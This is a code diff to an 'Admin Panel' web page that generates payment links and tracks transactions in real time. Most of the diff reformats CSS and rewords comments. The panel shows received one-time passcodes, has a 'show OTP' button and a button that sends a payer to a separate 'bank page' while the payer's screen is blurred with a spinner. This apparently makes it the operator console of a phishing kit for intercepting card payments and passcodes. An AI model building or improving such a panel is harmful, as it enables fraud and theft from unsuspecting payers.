@@ -6,28 +6,110 @@
   <title>Admin Panel</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <style>
-    body { background: #000; color: #fff; font-family: Arial, sans-serif; padding: 20px; }
-    h1 { text-align: center; margin-bottom: 20px; }
-    .container { max-width: 1200px; margin: 0 auto; }
-    .generate-link { background: #222; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
-    .form-group { margin-bottom: 15px; }
-    label { display: block; margin-bottom: 5px; color: #aaa; }
-    input, textarea { width: 100%; padding: 8px; border: 1px solid #444; background: #333; color: #fff; border-radius: 4px; }
-    .payment-link { margin-top: 15px; padding: 10px; background: #333; border-radius: 4px; display: none; }
-    .copy-btn { background: #22c55e; border: none; color: white; padding: 5px 10px; border-radius: 4px; cursor: pointer; margin-left: 10px; }
-    table { width: 100%; border-collapse: collapse; background: #111; margin-bottom: 20px; }
-    th, td { padding: 10px; border: 1px solid #333; text-align: left; font-size: 12px; }
-    th { background: #222; }
-    tr:nth-child(even) { background: #222; }
-    button { background: #4a90e2; color: #fff; border: none; padding: 6px 10px; margin-right: 4px; cursor: pointer; border-radius: 4px; font-size: 12px; }
-    button:hover { background: #357ABD; }
-    button:disabled { background: #666; cursor: not-allowed; }
-    .status-badge { padding: 2px 6px; border-radius: 3px; font-size: 11px; font-weight: bold; }
+    body {
+      background: #000; 
+      color: #fff;
+      font-family: Arial, sans-serif; 
+      padding: 20px;
+    }
+    h1 { 
+      text-align: center; 
+      margin-bottom: 20px; 
+    }
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .generate-link {
+      background: #222;
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      color: #aaa;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 8px;
+      border: 1px solid #444;
+      background: #333;
+      color: #fff;
+      border-radius: 4px;
+    }
+    .payment-link {
+      margin-top: 15px;
+      padding: 10px;
+      background: #333;
+      border-radius: 4px;
+      display: none;
+    }
+    .copy-btn {
+      background: #22c55e;
+      border: none;
+      color: white;
+      padding: 5px 10px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-left: 10px;
+    }
+    table {
+      width: 100%; 
+      border-collapse: collapse;
+      background: #111; 
+      margin-bottom: 20px;
+    }
+    th, td {
+      padding: 10px; 
+      border: 1px solid #333;
+      text-align: left; 
+      font-size: 12px;
+    }
+    th { 
+      background: #222; 
+    }
+    tr:nth-child(even) { 
+      background: #222; 
+    }
+    button {
+      background: #4a90e2; 
+      color: #fff;
+      border: none; 
+      padding: 6px 10px; 
+      margin-right: 4px;
+      cursor: pointer; 
+      border-radius: 4px; 
+      font-size: 12px;
+    }
+    button:hover {
+      background: #357ABD;
+    }
+    button:disabled {
+      background: #666;
+      cursor: not-allowed;
+    }
+    .status-badge {
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-size: 11px;
+      font-weight: bold;
+    }
     .status-processing { background: #f59e0b; color: #000; }
     .status-otp { background: #3b82f6; color: #fff; }
     .status-success { background: #22c55e; color: #fff; }
     .status-fail { background: #ef4444; color: #fff; }
-    .otp-received { background-color: #10B981; color: white; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
+    .otp-received {
+      background-color: #10B981;
+      color: white;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 12px;
+    }
     .show-otp-btn { background: #22c55e; }
     .bank-page-btn { background: #8b5cf6; }
     .bank-page-btn:hover { background: #7c3aed; }
@@ -89,9 +171,9 @@
     let transactions = new Map();
     let paymentLinks = new Map();
 
-    // Generate Payment Link Handler
+    // Prevent form refresh and generate link
     document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
+      e.preventDefault(); // IMPORTANT: prevents the page from reloading
       const amountInput = document.getElementById('amount');
       const descInput = document.getElementById('description');
       const linkContainer = document.getElementById('paymentLinkContainer');
@@ -106,10 +188,12 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ amount, description })
         });
+
         if (!response.ok) {
           const errorData = await response.json();
           throw new Error(errorData.message || 'Payment link generation failed');
         }
+
         const data = await response.json();
         document.getElementById('paymentLink').textContent = data.paymentLink;
         linkContainer.style.display = 'block';
@@ -150,8 +234,9 @@
           body: JSON.stringify({ invoiceId: id })
         });
         if (!response.ok) throw new Error('Failed to redirect to bank page');
-        // Open bankpage in new window and notify payment page to blur with spinner
+        // Open bank page in new window
         window.open(`/bankpage.html?invoiceId=${id}`, '_blank');
+        // Emit socket event so that the payment page can add a blur and spinner
         socket.emit('bankpage_show', { invoiceId: id });
         loadTransactions();
       } catch (error) {
@@ -277,8 +362,6 @@
 
     loadTransactions();
     setInterval(loadTransactions, 2000);
-
-    // Listen for Socket.IO events to refresh transactions
     socket.on('refreshTransactions', () => { loadTransactions(); });
   </script>
 </body>
